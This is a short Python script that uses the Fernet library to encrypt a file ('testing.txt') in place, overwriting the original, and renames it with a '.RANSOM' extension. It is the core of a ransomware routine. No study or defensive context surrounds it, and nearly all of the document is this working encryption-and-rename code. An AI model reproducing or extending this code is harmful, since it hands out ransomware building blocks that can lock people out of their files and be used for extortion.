  
from cryptography.fernet import Fernet
import os

# Assumes 'filekey.key' is created using the Fernet library
with open('filekey.key', 'rb') as filekey:
    key = filekey.read()

my_file = 'testing.txt'    
with open(my_file, 'rb') as file:
    original = file.read()

fernet = Fernet(key)    
encrypted = fernet.encrypt(original)

with open(my_file, 'wb') as encrypted_file:
    encrypted_file.write(encrypted)
    
base = os.path.splitext(my_file)[0]
os.rename(my_file, base + '.RANSOM')
